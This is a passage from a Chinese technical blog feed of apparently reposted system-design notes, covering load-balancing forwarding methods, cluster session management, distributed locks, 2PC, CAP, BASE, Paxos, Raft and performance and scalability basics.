src="/2023/03/11/%E9%9B%86%E7%BE%A4/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%AE%97%E6%B3%95_6_%E6%BA%90%E5%9C%B0%E5%9D%80%E5%93%88%E5%B8%8C%E6%B3%95_1.png" class="" title="负载均衡算法_6_源地址哈希法_1"></center><h2 id="转发实现"><a href="#转发实现" class="headerlink" title="转发实现"></a>转发实现</h2><h3 id="1-HTTP-重定向"><a href="#1-HTTP-重定向" class="headerlink" title="1.HTTP 重定向"></a>1.HTTP 重定向</h3><p>HTTP 重定向负载均衡服务器使用某种负载均衡算法计算得到服务器的 IP 地址之后，将该地址写入 HTTP 重定向报文中，状态码为 302。客户端收到重定向报文之后，需要重新向服务器发起请求。</p><p>缺点：</p><ul><li>需要两次请求，因此访问延迟比较高；</li><li>HTTP 负载均衡器处理能力有限，会限制集群的规模。</li></ul><p>该负载均衡转发的缺点比较明显，实际场景中很少使用它。</p><center><img src="/2023/03/11/%E9%9B%86%E7%BE%A4/%E8%BD%AC%E5%8F%91%E5%AE%9E%E7%8E%B0_1_HTTP%E9%87%8D%E5%AE%9A%E5%90%91.png" class="" title="转发实现_1_HTTP重定向"></center><h3 id="2-DNS-域名解析"><a href="#2-DNS-域名解析" class="headerlink" title="2.DNS 域名解析"></a>2.DNS 域名解析</h3><p>在 DNS 解析域名的同时使用负载均衡算法计算服务器 IP 地址。</p><p>优点：</p><ul><li>DNS 能够根据地理位置进行域名解析，返回离用户最近的服务器 IP 地址。</li></ul><p>缺点：</p><ul><li>由于 DNS 具有多级结构，每一级的域名记录都可能被缓存，当下线一台服务器需要修改 DNS 记录时，需要过很长一段时间才能生效。</li></ul><p>大型网站基本使用了 DNS 做为第一级负载均衡手段，然后在内部使用其它方式做第二级负载均衡。也就是说，域名解析的结果为内部的负载均衡服务器 IP 地址。</p><center><img src="/2023/03/11/%E9%9B%86%E7%BE%A4/%E8%BD%AC%E5%8F%91%E5%AE%9E%E7%8E%B0_2_DNS%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90.png" class="" title="转发实现_2_DNS域名解析"></center><h3 id="3-反向代理服务器"><a href="#3-反向代理服务器" class="headerlink" title="3.反向代理服务器"></a>3.反向代理服务器</h3><p>反向代理服务器位于源服务器前面，用户的请求需要先经过反向代理服务器才能到达源服务器。反向代理可以用来进行缓存、日志记录等，同时也可以用来做为负载均衡服务器。</p><p>在这种负载均衡转发方式下，客户端不直接请求源服务器，因此源服务器不需要外部 IP 地址，而反向代理需要配置内部和外部两套 IP 地址。</p><p>优点：</p><ul><li>与其它功能集成在一起，部署简单。</li></ul><p>缺点：</p><ul><li>所有请求和响应都需要经过反向代理服务器，它可能会成为性能瓶颈。</li></ul><h3 id="4-网络层"><a href="#4-网络层" class="headerlink" title="4.网络层"></a>4.网络层</h3><p>在操作系统内核进程获取网络数据包，根据负载均衡算法计算源服务器的 IP 地址，并修改请求数据包的目的 IP 地址，最后进行转发。</p><p>源服务器返回的响应也需要经过负载均衡服务器，通常是让负载均衡服务器同时作为集群的网关服务器来实现。</p><p>优点：</p><ul><li>在内核进程中进行处理，性能比较高。</li></ul><p>缺点：</p><ul><li>和反向代理一样，所有的请求和响应都经过负载均衡服务器，会成为性能瓶颈。</li></ul><h3 id="5-链路层"><a href="#5-链路层" class="headerlink" title="5.链路层"></a>5.链路层</h3><p>在链路层根据负载均衡算法计算源服务器的 MAC 地址，并修改请求数据包的目的 MAC 地址，并进行转发。</p><p>通过配置源服务器的虚拟 IP 地址和负载均衡服务器的 IP 地址一致，从而不需要修改 IP 地址就可以进行转发。也正因为 IP 地址一样，所以源服务器的响应不需要转发回负载均衡服务器，可以直接转发给客户端，避免了负载均衡服务器的成为瓶颈。</p><p>这是一种三角传输模式，被称为直接路由。对于提供下载和视频服务的网站来说，直接路由避免了大量的网络传输数据经过负载均衡服务器。</p><p>这是目前大型网站使用最广负载均衡转发方式，在 Linux 平台可以使用的负载均衡服务器为 LVS（Linux Virtual Server）。</p><h1 id="二、集群下的-Session-管理"><a href="#二、集群下的-Session-管理" class="headerlink" title="二、集群下的 Session 管理"></a>二、集群下的 Session 管理</h1><p>一个用户的 Session 信息如果存储在一个服务器上，那么当负载均衡器把用户的下一个请求转发到另一个服务器，由于服务器没有用户的 Session 信息，那么该用户就需要重新进行登录等操作。</p><h2 id="Sticky-Session"><a href="#Sticky-Session" class="headerlink" title="Sticky Session"></a>Sticky Session</h2><p>需要配置负载均衡器，使得一个用户的所有请求都路由到同一个服务器，这样就可以把用户的 Session 存放在该服务器中。</p><p>缺点：</p><ul><li>当服务器宕机时，将丢失该服务器上的所有 Session。</li></ul><center><img src="/2023/03/11/%E9%9B%86%E7%BE%A4/Sticky_Session.png" class="" title="Sticky_Session"></center><h2 id="Session-Replication"><a href="#Session-Replication" class="headerlink" title="Session Replication"></a>Session Replication</h2><p>在服务器之间进行 Session 同步操作，每个服务器都有所有用户的 Session 信息，因此用户可以向任何一个服务器进行请求。</p><p>缺点：</p><ul><li>占用过多内存；</li><li>同步过程占用网络带宽以及服务器处理器时间。</li></ul><center><img src="/2023/03/11/%E9%9B%86%E7%BE%A4/Session_Replication.png" class="" title="Session_Replication"></center><h2 id="Session-Server"><a href="#Session-Server" class="headerlink" title="Session Server"></a>Session Server</h2><p>使用一个单独的服务器存储 Session 数据，可以使用传统的 MySQL，也使用 Redis 或者 Memcached 这种内存型数据库。</p><p>优点：</p><ul><li><p>为了使得大型网站具有伸缩性，集群中的应用服务器通常需要保持无状态，那么应用服务器不能存储用户的会话信息。Session Server 将用户的会话信息单独进行存储，从而保证了应用服务器的无状态。<br>缺点：</p></li><li><p>需要去实现存取 Session 的代码。</p></li></ul><center><img src="/2023/03/11/%E9%9B%86%E7%BE%A4/Session_Server.png" class="" title="Session_Server"></center><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://www.cyc2018.xyz/">https://www.cyc2018.xyz/</a></p>]]></content>
    
    
    <categories>
      
      <category>系统设计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>分布式</title>
    <link href="/2023/03/10/%E5%88%86%E5%B8%83%E5%BC%8F/"/>
    <url>/2023/03/10/%E5%88%86%E5%B8%83%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="一、分布式锁"><a href="#一、分布式锁" class="headerlink" title="一、分布式锁"></a>一、分布式锁</h1><p>在单机场景下，可以使用语言的内置锁来实现进程同步。但是在分布式场景下，需要同步的进程可能位于不同的节点上，那么就需要使用分布式锁。</p><p>阻塞锁通常使用互斥量来实现：</p><ul><li>互斥量为 0 表示有其它进程在使用锁，此时处于锁定状态；</li><li>互斥量为 1 表示未锁定状态。</li></ul><p>1 和 0 可以用一个整型值表示，也可以用某个数据是否存在表示。</p><h2 id="数据库的唯一索引"><a href="#数据库的唯一索引" class="headerlink" title="数据库的唯一索引"></a>数据库的唯一索引</h2><p>获得锁时向表中插入一条记录，释放锁时删除这条记录。唯一索引可以保证该记录只被插入一次，那么就可以用这个记录是否存在来判断是否处于锁定状态。</p><p>存在以下几个问题：</p><ul><li>锁没有失效时间，解锁失败的话其它进程无法再获得该锁；</li><li>只能是非阻塞锁，插入失败直接就报错了，无法重试；</li><li>不可重入，已经获得锁的进程也必须重新获取锁。</li></ul><h2 id="Redis-的-SETNX-命令"><a href="#Redis-的-SETNX-命令" class="headerlink" title="Redis 的 SETNX 命令"></a>Redis 的 SETNX 命令</h2><p>使用 SETNX（set if not exist）指令插入一个键值对，如果 Key 已经存在，那么会返回 False，否则插入成功并返回 True。</p><p>SETNX 指令和数据库的唯一索引类似，保证了只存在一个 Key 的键值对，那么可以用一个 Key 的键值对是否存在来判断是否存于锁定状态。</p><p>EXPIRE 指令可以为一个键值对设置一个过期时间，从而避免了数据库唯一索引实现方式中释放锁失败的问题。</p><h2 id="Redis-的-RedLock-算法"><a href="#Redis-的-RedLock-算法" class="headerlink" title="Redis 的 RedLock 算法"></a>Redis 的 RedLock 算法</h2><p>使用了多个 Redis 实例来实现分布式锁，这是为了保证在发生单点故障时仍然可用。</p><ul><li>尝试从 N 个互相独立 Redis 实例获取锁；</li><li>计算获取锁消耗的时间，只有时间小于锁的过期时间，并且从大多数（N &#x2F; 2 + 1）实例上获取了锁，才认为获取锁成功；</li><li>如果获取锁失败，就到每个实例上释放锁。</li></ul><h2 id="Zookeeper-的有序节点"><a href="#Zookeeper-的有序节点" class="headerlink" title="Zookeeper 的有序节点"></a>Zookeeper 的有序节点</h2><ol><li><strong>Zookeeper 抽象模型</strong></li></ol><p>Zookeeper 提供了一种树形结构的命名空间，&#x2F;app1&#x2F;p_1 节点的父节点为 &#x2F;app1。</p><center><img src="/2023/03/10/%E5%88%86%E5%B8%83%E5%BC%8F/Zookeeper%E6%8A%BD%E8%B1%A1%E6%A8%A1%E5%9E%8B.png" class="" title="Zookeeper抽象模型"></center><ol start="2"><li><strong>节点类型</strong></li></ol><ul><li>永久节点：不会因为会话结束或者超时而消失；</li><li>临时节点：如果会话结束或者超时就会消失；</li><li>有序节点：会在节点名的后面加一个数字后缀，并且是有序的，例如生成的有序节点为 &#x2F;lock&#x2F;node-0000000000，它的下一个有序节点则为 &#x2F;lock&#x2F;node-0000000001，以此类推。</li></ul><ol start="3"><li><strong>监听器</strong></li></ol><p>为一个节点注册监听器，在节点状态发生改变时，会给客户端发送消息。</p><ol start="4"><li><strong>分布式锁实现</strong></li></ol><ul><li>创建一个锁目录 &#x2F;lock；</li><li>当一个客户端需要获取锁时，在 &#x2F;lock 下创建临时的且有序的子节点；</li><li>客户端获取 &#x2F;lock 下的子节点列表，判断自己创建的子节点是否为当前子节点列表中序号最小的子节点，如果是则认为获得锁；否则监听自己的前一个子节点，获得子节点的变更通知后重复此步骤直至获得锁；</li><li>执行业务代码，完成后，删除对应的子节点。</li></ul><ol start="5"><li><strong>会话超时</strong></li></ol><p>如果一个已经获得锁的会话超时了，因为创建的是临时节点，所以该会话对应的临时节点会被删除，其它会话就可以获得锁了。可以看到，这种实现方式不会出现数据库的唯一索引实现方式释放锁失败的问题。</p><ol start="6"><li><strong>羊群效应</strong></li></ol><p>一个节点未获得锁，只需要监听自己的前一个子节点，这是因为如果监听所有的子节点，那么任意一个子节点状态改变，其它所有子节点都会收到通知（羊群效应，一只羊动起来，其它羊也会一哄而上），而我们只希望它的后一个子节点收到通知。</p><h1 id="二、分布式事务"><a href="#二、分布式事务" class="headerlink" title="二、分布式事务"></a>二、分布式事务</h1><p>指事务的操作位于不同的节点上，需要保证事务的 ACID 特性。</p><p>例如在下单场景下，库存和订单如果不在同一个节点上，就涉及分布式事务。</p><p>分布式锁和分布式事务区别：</p><ul><li>锁问题的关键在于进程操作的互斥关系，例如多个进程同时修改账户的余额，如果没有互斥关系则会导致该账户的余额不正确。</li><li>而事务问题的关键则在于事务涉及的一系列操作需要满足 ACID 特性，例如要满足原子性操作则需要这些操作要么都执行，要么都不执行。</li></ul><h2 id="2PC"><a href="#2PC" class="headerlink" title="2PC"></a>2PC</h2><p>两阶段提交（Two-phase Commit，2PC），通过引入协调者（Coordinator）来协调参与者的行为，并最终决定这些参与者是否要真正执行事务。</p><h3 id="1-运行过程"><a href="#1-运行过程" class="headerlink" title="1. 运行过程"></a>1. 运行过程</h3><h4 id="1-1-准备阶段"><a href="#1-1-准备阶段" class="headerlink" title="1.1 准备阶段"></a>1.1 准备阶段</h4><p>协调者询问参与者事务是否执行成功，参与者发回事务执行结果。询问可以看成一种投票，需要参与者都同意才能执行。</p><center><img src="/2023/03/10/%E5%88%86%E5%B8%83%E5%BC%8F/1_1%E5%87%86%E5%A4%87%E9%98%B6%E6%AE%B5.png" class="" title="1_1准备阶段"></center><h4 id="1-2-提交阶段"><a href="#1-2-提交阶段" class="headerlink" title="1.2 提交阶段"></a>1.2 提交阶段</h4><p>如果事务在每个参与者上都执行成功，事务协调者发送通知让参与者提交事务；否则，协调者发送通知让参与者回滚事务。</p><p>需要注意的是，在准备阶段，参与者执行了事务，但是还未提交。只有在提交阶段接收到协调者发来的通知后，才进行提交或者回滚。</p><center><img src="/2023/03/10/%E5%88%86%E5%B8%83%E5%BC%8F/1_2%E6%8F%90%E4%BA%A4%E9%98%B6%E6%AE%B5.png" class="" title="1_2提交阶段"></center><h3 id="2-存在的问题"><a href="#2-存在的问题" class="headerlink" title="2. 存在的问题"></a>2. 存在的问题</h3><h4 id="2-1-同步阻塞"><a href="#2-1-同步阻塞" class="headerlink" title="2.1 同步阻塞"></a>2.1 同步阻塞</h4><p>所有事务参与者在等待其它参与者响应的时候都处于同步阻塞等待状态，无法进行其它操作。</p><h4 id="2-2-单点问题"><a href="#2-2-单点问题" class="headerlink" title="2.2 单点问题"></a>2.2 单点问题</h4><p>协调者在 2PC 中起到非常大的作用，发生故障将会造成很大影响。特别是在提交阶段发生故障，所有参与者会一直同步阻塞等待，无法完成其它操作。</p><h4 id="2-3-数据不一致"><a href="#2-3-数据不一致" class="headerlink" title="2.3 数据不一致"></a>2.3 数据不一致</h4><p>在提交阶段，如果协调者只发送了部分 Commit 消息，此时网络发生异常，那么只有部分参与者接收到 Commit 消息，也就是说只有部分参与者提交了事务，使得系统数据不一致。</p><h4 id="2-4-太过保守"><a href="#2-4-太过保守" class="headerlink" title="2.4 太过保守"></a>2.4 太过保守</h4><p>任意一个节点失败就会导致整个事务失败，没有完善的容错机制。</p><h2 id="本地消息表"><a href="#本地消息表" class="headerlink" title="本地消息表"></a>本地消息表</h2><p>本地消息表与业务数据表处于同一个数据库中，这样就能利用本地事务来保证在对这两个表的操作满足事务特性，并且使用了消息队列来保证最终一致性。</p><ol><li><p>在分布式事务操作的一方完成写业务数据的操作之后向本地消息表发送一个消息，本地事务能保证这个消息一定会被写入本地消息表中。</p></li><li><p>之后将本地消息表中的消息转发到消息队列中，如果转发成功则将消息从本地消息表中删除，否则继续重新转发。</p></li><li><p>在分布式事务操作的另一方从消息队列中读取一个消息，并执行消息中的操作。</p></li></ol><center><img src="/2023/03/10/%E5%88%86%E5%B8%83%E5%BC%8F/%E6%9C%AC%E5%9C%B0%E6%B6%88%E6%81%AF%E8%A1%A8.png" class="" title="本地消息表"></center><h1 id="三、CAP"><a href="#三、CAP" class="headerlink" title="三、CAP"></a>三、CAP</h1><p>分布式系统不可能同时满足一致性（C：Consistency）、可用性（A：Availability）和分区容忍性（P：Partition Tolerance），最多只能同时满足其中两项。</p><center><img src="/2023/03/10/%E5%88%86%E5%B8%83%E5%BC%8F/CAP.png" class="" title="CAP"></center><h2 id="一致性"><a href="#一致性" class="headerlink" title="一致性"></a>一致性</h2><p>一致性指的是多个数据副本是否能保持一致的特性，在一致性的条件下，系统在执行数据更新操作之后能够从一致性状态转移到另一个一致性状态。</p><p>对系统的一个数据更新成功之后，如果所有用户都能够读取到最新的值，该系统就被认为具有强一致性。</p><h2 id="可用性"><a href="#可用性" class="headerlink" title="可用性"></a>可用性</h2><p>可用性指分布式系统在面对各种异常时可以提供正常服务的能力，可以用系统可用时间占总时间的比值来衡量，4 个 9 的可用性表示系统 99.99% 的时间是可用的。</p><p>在可用性条件下，要求系统提供的服务一直处于可用的状态，对于用户的每一个操作请求总是能够在有限的时间内返回结果。</p><h2 id="分区容忍性"><a href="#分区容忍性" class="headerlink" title="分区容忍性"></a>分区容忍性</h2><p>网络分区指分布式系统中的节点被划分为多个区域，每个区域内部可以通信，但是区域之间无法通信。</p><p>在分区容忍性条件下，分布式系统在遇到任何网络分区故障的时候，仍然需要能对外提供一致性和可用性的服务，除非是整个网络环境都发生了故障。</p><h2 id="权衡"><a href="#权衡" class="headerlink" title="权衡"></a>权衡</h2><p>在分布式系统中，分区容忍性必不可少，因为需要总是假设网络是不可靠的。因此，CAP 理论实际上是要在可用性和一致性之间做权衡。</p><p>可用性和一致性往往是冲突的，很难使它们同时满足。在多个节点之间进行数据同步时，</p><ul><li>为了保证一致性（CP），不能访问未同步完成的节点，也就失去了部分可用性；</li><li>为了保证可用性（AP），允许读取所有节点的数据，但是数据可能不一致。</li></ul><h1 id="四、BASE"><a href="#四、BASE" class="headerlink" title="四、BASE"></a>四、BASE</h1><p>BASE 是基本可用（Basically Available）、软状态（Soft State）和最终一致性（Eventually Consistent）三个短语的缩写。</p><p>BASE 理论是对 CAP 中一致性和可用性权衡的结果，它的核心思想是：即使无法做到强一致性，但每个应用都可以根据自身业务特点，采用适当的方式来使系统达到最终一致性。</p><h2 id="基本可用"><a href="#基本可用" class="headerlink" title="基本可用"></a>基本可用</h2><p>指分布式系统在出现故障的时候，保证核心可用，允许损失部分可用性。</p><p>例如，电商在做促销时，为了保证购物系统的稳定性，部分消费者可能会被引导到一个降级的页面。</p><h2 id="软状态"><a href="#软状态" class="headerlink" title="软状态"></a>软状态</h2><p>指允许系统中的数据存在中间状态，并认为该中间状态不会影响系统整体可用性，即允许系统不同节点的数据副本之间进行同步的过程存在时延。</p><h2 id="最终一致性"><a href="#最终一致性" class="headerlink" title="最终一致性"></a>最终一致性</h2><p>最终一致性强调的是系统中所有的数据副本，在经过一段时间的同步后，最终能达到一致的状态。</p><p>ACID 要求强一致性，通常运用在传统的数据库系统上。而 BASE 要求最终一致性，通过牺牲强一致性来达到可用性，通常运用在大型分布式系统中。</p><p>在实际的分布式场景中，不同业务单元和组件对一致性的要求是不同的，因此 ACID 和 BASE 往往会结合在一起使用。</p><h1 id="五、Paxos"><a href="#五、Paxos" class="headerlink" title="五、Paxos"></a>五、Paxos</h1><p>用于达成共识性问题，即对多个节点产生的值，该算法能保证只选出唯一一个值。</p><p>主要有三类节点：</p><ul><li>提议者（Proposer）：提议一个值；</li><li>接受者（Acceptor）：对每个提议进行投票；</li><li>告知者（Learner）：被告知投票的结果，不参与投票过程。</li></ul><center><img src="/2023/03/10/%E5%88%86%E5%B8%83%E5%BC%8F/Paxos.png" class="" title="Paxos"></center><h2 id="执行过程"><a href="#执行过程" class="headerlink" title="执行过程"></a>执行过程</h2><p>规定一个提议包含两个字段：[n, v]，其中 n 为序号（具有唯一性），v 为提议值。</p><ol><li>Prepare阶段</li></ol><p>下图演示了两个 Proposer 和三个 Acceptor 的系统中运行该算法的初始过程，每个 Proposer 都会向所有 Acceptor 发送 Prepare 请求。</p><center><img src="/2023/03/10/%E5%88%86%E5%B8%83%E5%BC%8F/1_prepare%E9%98%B6%E6%AE%B5Figure2.png" class="" title="1_prepare阶段Figure2"></center><p>当 Acceptor 接收到一个 Prepare 请求，包含的提议为 [n1, v1]，并且之前还未接收过 Prepare 请求，那么发送一个 Prepare 响应，设置当前接收到的提议为 [n1, v1]，并且保证以后不会再接受序号小于 n1 的提议。</p><p>如下图，Acceptor X 在收到 [n&#x3D;2, v&#x3D;8] 的 Prepare 请求时，由于之前没有接收过提议，因此就发送一个 [no previous] 的 Prepare 响应，设置当前接收到的提议为 [n&#x3D;2, v&#x3D;8]，并且保证以后不会再接受序号小于 2 的提议。其它的 Acceptor 类似。</p><center><img src="/2023/03/10/%E5%88%86%E5%B8%83%E5%BC%8F/1_prepare%E9%98%B6%E6%AE%B5Figure3.png" class="" title="1_prepare阶段Figure3"></center><p>如果 Acceptor 接收到一个 Prepare 请求，包含的提议为 [n2, v2]，并且之前已经接收过提议 [n1, v1]。如果 n1 &gt; n2，那么就丢弃该提议请求；否则，发送 Prepare 响应，该 Prepare 响应包含之前已经接收过的提议 [n1, v1]，设置当前接收到的提议为 [n2, v2]，并且保证以后不会再接受序号小于 n2 的提议。</p><p>如下图，Acceptor Z 收到 Proposer A 发来的 [n&#x3D;2, v&#x3D;8] 的 Prepare 请求，由于之前已经接收过 [n&#x3D;4, v&#x3D;5] 的提议，并且 n &gt; 2，因此就抛弃该提议请求；Acceptor X 收到 Proposer B 发来的 [n&#x3D;4, v&#x3D;5] 的 Prepare 请求，因为之前接收到的提议为 [n&#x3D;2, v&#x3D;8]，并且 2 &lt;&#x3D; 4，因此就发送 [n&#x3D;2, v&#x3D;8] 的 Prepare 响应，设置当前接收到的提议为 [n&#x3D;4, v&#x3D;5]，并且保证以后不会再接受序号小于 4 的提议。Acceptor Y 类似。</p><center><img src="/2023/03/10/%E5%88%86%E5%B8%83%E5%BC%8F/1_prepare%E9%98%B6%E6%AE%B5Figure4.png" class="" title="1_prepare阶段Figure4"></center><ol start="2"><li>Accept阶段</li></ol><p>当一个 Proposer 接收到超过一半 Acceptor 的 Prepare 响应时，就可以发送 Accept 请求。</p><p>Proposer A 接收到两个 Prepare 响应之后，就发送 [n&#x3D;2, v&#x3D;8] Accept 请求。该 Accept 请求会被所有 Acceptor 丢弃，因为此时所有 Acceptor 都保证不接受序号小于 4 的提议。</p><p>Proposer B 过后也收到了两个 Prepare 响应，因此也开始发送 Accept 请求。需要注意的是，Accept 请求的 v 需要取它收到的最大提议编号对应的 v 值，也就是 8。因此它发送 [n&#x3D;4, v&#x3D;8] 的 Accept 请求。</p><center><img src="/2023/03/10/%E5%88%86%E5%B8%83%E5%BC%8F/2_accept%E9%98%B6%E6%AE%B5Figure5.png" class="" title="2_accept阶段Figure5"></center><ol start="3"><li>Learn阶段</li></ol><p>Acceptor 接收到 Accept 请求时，如果序号大于等于该 Acceptor 承诺的最小序号，那么就发送 Learn 提议给所有的 Learner。当 Learner 发现有大多数的 Acceptor 接收了某个提议，那么该提议的提议值就被 Paxos 选择出来。</p><center><img src="/2023/03/10/%E5%88%86%E5%B8%83%E5%BC%8F/3_Learn%E9%98%B6%E6%AE%B5.png" class="" title="3_Learn阶段"></center><h2 id="约束条件"><a href="#约束条件" class="headerlink" title="约束条件"></a>约束条件</h2><ol><li><strong>正确性</strong></li></ol><p>指只有一个提议值会生效。</p><p>因为 Paxos 协议要求每个生效的提议被多数 Acceptor 接收，并且 Acceptor 不会接受两个不同的提议，因此可以保证正确性。</p><ol start="2"><li><strong>可终止性</strong></li></ol><p>指最后总会有一个提议生效。</p><p>Paxos 协议能够让 Proposer 发送的提议朝着能被大多数 Acceptor 接受的那个提议靠拢，因此能够保证可终止性。</p><h1 id="六、Raft"><a href="#六、Raft" class="headerlink" title="六、Raft"></a>六、Raft</h1><p>Raft 也是分布式一致性协议，主要是用来竞选主节点。</p><p><a href="http://thesecretlivesofdata.com/raft/">Raft: Understandable Distributed Consensus</a></p><h2 id="单个-Candidate-的竞选"><a href="#单个-Candidate-的竞选" class="headerlink" title="单个 Candidate 的竞选"></a>单个 Candidate 的竞选</h2><p>有三种节点：Follower、Candidate 和 Leader。Leader 会周期性的发送心跳包给 Follower。每个 Follower 都设置了一个随机的竞选超时时间，一般为 150ms~300ms，如果在这个时间内没有收到 Leader 的心跳包，就会变成 Candidate，进入竞选阶段。</p><ul><li>下图展示一个分布式系统的最初阶段，此时只有 Follower 没有 Leader。Node A 等待一个随机的竞选超时时间之后，没收到 Leader 发来的心跳包，因此进入竞选阶段。</li></ul><center><img src="/2023/03/10/%E5%88%86%E5%B8%83%E5%BC%8F/candidate%E7%AB%9E%E9%80%89.png" class="" title="candidate竞选"></center><ul><li>此时 Node A 发送投票请求给其它所有节点。</li></ul><center><img src="/2023/03/10/%E5%88%86%E5%B8%83%E5%BC%8F/vote_NodeA.png" class="" title="vote_NodeA"></center><ul><li>其它节点会对请求进行回复，如果超过一半的节点回复了，那么该 Candidate 就会变成 Leader。</li></ul><center><img src="/2023/03/10/%E5%88%86%E5%B8%83%E5%BC%8F/NodeA%E6%88%90%E4%B8%BAleader.png" class="" title="NodeA成为leader"></center><ul><li>之后 Leader 会周期性地发送心跳包给 Follower，Follower 接收到心跳包，会重新开始计时。</li></ul><center><img src="/2023/03/10/%E5%88%86%E5%B8%83%E5%BC%8F/leader%E5%8F%91%E5%BF%83%E8%B7%B3.png" class="" title="leader发心跳"></center><h2 id="多个-Candidate-的竞选"><a href="#多个-Candidate-的竞选" class="headerlink" title="多个 Candidate 的竞选"></a>多个 Candidate 的竞选</h2><ul><li>如果有多个 Follower 成为 Candidate，并且所获得票数相同，那么就需要重新开始投票。例如下图中 Node B 和 Node D 都获得两票，需要重新开始投票。</li></ul><center><img src="/2023/03/10/%E5%88%86%E5%B8%83%E5%BC%8F/%E5%A4%9Acandidate_%E9%87%8D%E6%96%B0%E6%8A%95%E7%A5%A8.png" class="" title="多candidate_重新投票"></center><ul><li>由于每个节点设置的随机竞选超时时间不同，因此下一次再次出现多个 Candidate 并获得同样票数的概率很低。</li></ul><center><img src="/2023/03/10/%E5%88%86%E5%B8%83%E5%BC%8F/leader%E5%8F%91%E5%BF%83%E8%B7%B3.png" class="" title="leader发心跳"></center><h2 id="数据同步"><a href="#数据同步" class="headerlink" title="数据同步"></a>数据同步</h2><ul><li>来自客户端的修改都会被传入 Leader。注意该修改还未被提交，只是写入日志中。</li></ul><center><img src="/2023/03/10/%E5%88%86%E5%B8%83%E5%BC%8F/%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5_%E4%BF%AE%E6%94%B9%E6%9C%AA%E6%8F%90%E4%BA%A4.png" class="" title="数据同步_修改未提交"></center><ul><li>Leader 会把修改复制到所有 Follower。</li></ul><center><img src="/2023/03/10/%E5%88%86%E5%B8%83%E5%BC%8F/%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5_%E5%A4%8D%E5%88%B6%E4%BF%AE%E6%94%B9.png" class="" title="数据同步_复制修改"></center><ul><li>Leader 会等待大多数的 Follower 也进行了修改，然后才将修改提交。</li></ul><center><img src="/2023/03/10/%E5%88%86%E5%B8%83%E5%BC%8F/%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5_leader%E6%8F%90%E4%BA%A4%E4%BF%AE%E6%94%B9.png" class="" title="数据同步_leader提交修改"></center><ul><li>此时 Leader 会通知的所有 Follower 让它们也提交修改，此时所有节点的值达成一致。</li></ul><center><img src="/2023/03/10/%E5%88%86%E5%B8%83%E5%BC%8F/%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5_%E8%8A%82%E7%82%B9%E8%BE%BE%E6%88%90%E4%B8%80%E8%87%B4.png" class="" title="数据同步_节点达成一致"></center><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://www.cyc2018.xyz/">https://www.cyc2018.xyz/</a></p>]]></content>
    
    
    <categories>
      
      <category>系统设计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>系统设计基础</title>
    <link href="/2023/03/10/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/03/10/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="一、性能"><a href="#一、性能" class="headerlink" title="一、性能"></a>一、性能</h1><h2 id="性能指标"><a href="#性能指标" class="headerlink" title="性能指标"></a>性能指标</h2><ol><li><strong>相应时间</strong></li></ol><p>指某个请求从发出到接收到响应消耗的时间。</p><p>在对响应时间进行测试时，通常采用重复请求的方式，然后计算平均响应时间。</p><ol start="2"><li><strong>吞吐量</strong></li></ol><p>指系统在单位时间内可以处理的请求数量，通常使用每秒的请求数来衡量。</p><ol start="3"><li><strong>并发用户数</strong></li></ol><p>指系统能同时处理的并发用户请求数量。</p><p>在没有并发存在的系统中，请求被顺序执行，此时响应时间为吞吐量的倒数。例如系统支持的吞吐量为 100 req&#x2F;s，那么平均响应时间应该为 0.01s。</p><p>目前的大型系统都支持多线程来处理并发请求，多线程能够提高吞吐量以及缩短响应时间，主要有两个原因：</p><ul><li>多 CPU</li><li>IO 等待时间</li></ul><p>使用 IO 多路复用等方式，系统在等待一个 IO 操作完成的这段时间内不需要被阻塞，可以去处理其它请求。通过将这个等待时间利用起来，使得 CPU 利用率大大提高。</p><p>并发用户数不是越高越好，因为如果并发用户数太高，系统来不及处理这么多的请求，会使得过多的请求需要等待，那么响应时间就会大大提高</p><h2 id="性能优化"><a href="#性能优化" class="headerlink" title="性能优化"></a>性能优化</h2><ol><li><strong>集群</strong></li></ol><p>将多台服务器组成集群，使用负载均衡将请求转发到集群中，避免单一服务器的负载压力过大导致性能降低。</p><ol start="2"><li><strong>缓存</strong></li></ol><p>缓存能够提高性能的原因如下：</p><ul><li>缓存数据通常位于内存等介质中，这种介质对于读操作特别快；</li><li>缓存数据可以位于靠近用户的地理位置上；</li><li>可以将计算结果进行缓存，从而避免重复计算。</li></ul><ol start="3"><li><strong>异步</strong></li></ol><p>某些流程可以将操作转换为消息，将消息发送到消息队列之后立即返回，之后这个操作会被异步处理。</p><h1 id="二、伸缩性"><a href="#二、伸缩性" class="headerlink" title="二、伸缩性"></a>二、伸缩性</h1><p>指不断向集群中添加服务器来缓解不断上升的用户并发访问压力和不断增长的数据存储需求。</p><h2 id="伸缩性与性能"><a href="#伸缩性与性能" class="headerlink" title="伸缩性与性能"></a>伸缩性与性能</h2><p>如果系统存在性能问题，那么单个用户的请求总是很慢的；</p><p>如果系统存在伸缩性问题，那么单个用户的请求可能会很快，但是在并发数很高的情况下系统会很慢。</p><h2 id="实现伸缩性"><a href="#实现伸缩性" class="headerlink" title="实现伸缩性"></a>实现伸缩性</h2><p>应用服务器只要不具有状态，那么就可以很容易地通过负载均衡器向集群中添加新的服务器。</p><p>关系型数据库的伸缩性通过 Sharding 来实现，将数据按一定的规则分布到不同的节点上，从而解决单台存储服务器的存储空间限制。</p><p>对于非关系型数据库，它们天生就是为海量数据而诞生，对伸缩性的支持特别好。</p><h1 id="三、扩展性"><a href="#三、扩展性" class="headerlink" 